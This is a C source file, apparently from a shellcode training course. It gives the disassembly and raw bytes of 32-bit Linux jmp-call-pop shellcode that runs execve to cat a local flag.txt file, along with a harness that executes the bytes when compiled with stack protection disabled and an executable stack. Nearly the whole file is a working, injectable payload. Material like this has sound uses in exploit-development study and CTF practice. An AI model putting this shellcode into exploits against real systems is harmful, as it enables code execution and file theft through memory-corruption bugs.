/*

// Author: Cameron, James
// Compile With: gcc test.c -fno-stack-protector -z execstack
// Tested On: Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
//            Ubuntu 12.04.4 LTS

slae@ubuntu:~/Documents/github/shellcode/execve-cat-flag_JmpCallPop$ objdump -M intel -d ./execve-cat-flag_JmpCallPop

./execve-cat-flag_JmpCallPop:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       eb 21                   jmp    8048083 <call_shellcode>

08048062 <shellcode>:
 8048062:       5e                      pop    esi
 8048063:       31 c0                   xor    eax,eax
 8048065:       88 46 08                mov    BYTE PTR [esi+0x8],al
 8048068:       88 46 13                mov    BYTE PTR [esi+0x13],al
 804806b:       89 76 14                mov    DWORD PTR [esi+0x14],esi
 804806e:       8d 5e 09                lea    ebx,[esi+0x9]
 8048071:       89 5e 18                mov    DWORD PTR [esi+0x18],ebx
 8048074:       89 46 1c                mov    DWORD PTR [esi+0x1c],eax
 8048077:       b0 0b                   mov    al,0xb
 8048079:       8d 1e                   lea    ebx,[esi]
 804807b:       8d 4e 14                lea    ecx,[esi+0x14]
 804807e:       8d 56 1c                lea    edx,[esi+0x1c]
 8048081:       cd 80                   int    0x80

08048083 <call_shellcode>:
 8048083:       e8 da ff ff ff          call   8048062 <shellcode>

08048088 <buf>:
 8048088:       2f                      das    
 8048089:       62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
 804808c:       2f                      das    
 804808d:       63 61 74                arpl   WORD PTR [ecx+0x74],sp
 8048090:       41                      inc    ecx
 8048091:       2e                      cs
 8048092:       2f                      das    
 8048093:       66                      data16
 8048094:       6c                      ins    BYTE PTR es:[edi],dx
 8048095:       61                      popa   
 8048096:       67                      addr16
 8048097:       2e                      cs
 8048098:       74 78                   je     8048112 <__bss_start+0x6a>
 804809a:       74 42                   je     80480de <__bss_start+0x36>
 804809c:       43                      inc    ebx
 804809d:       43                      inc    ebx
 804809e:       43                      inc    ebx
 804809f:       43                      inc    ebx
 80480a0:       44                      inc    esp
 80480a1:       44                      inc    esp
 80480a2:       44                      inc    esp
 80480a3:       44                      inc    esp
 80480a4:       45                      inc    ebp
 80480a5:       45                      inc    ebp
 80480a6:       45                      inc    ebp
 80480a7:       45                      inc    ebp


*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\xeb\x21\x5e\x31\xc0\x88\x46\x08\x88\x46\x13\x89\x76\x14\x8d\x5e\x09\x89\x5e\x18\x89\x46\x1c\xb0\x0b\x8d\x1e\x8d\x4e\x14\x8d\x56\x1c\xcd\x80\xe8\xda\xff\xff\xff\x2f\x62\x69\x6e\x2f\x63\x61\x74\x41\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45";

int main(){

	printf("[*]Executing shellcode of length: %d\n", strlen(shellcode));
	int (*run)() = (int(*)())shellcode;
	run();
	return 0;

}
